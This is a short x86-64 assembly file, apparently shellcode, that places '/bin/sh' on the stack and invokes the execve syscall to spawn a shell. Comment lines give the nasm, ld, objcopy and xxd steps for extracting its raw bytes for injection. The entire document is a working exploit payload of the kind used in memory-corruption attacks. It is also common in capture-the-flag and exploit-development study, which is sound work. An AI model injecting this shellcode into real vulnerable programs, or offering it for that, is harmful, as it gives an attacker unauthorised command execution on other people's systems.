BITS 64
mov rbx, 0x68732f6e69622f 
push rbx              
mov rdi, rsp          
mov al, 0x3b          
syscall               



;nasm -f elf64 shellcraft.asm 
;ld -m elf_x86_64 shellcraft.o 
;objcopy --dump-section .text=sc a.out 
;xxd -p sc

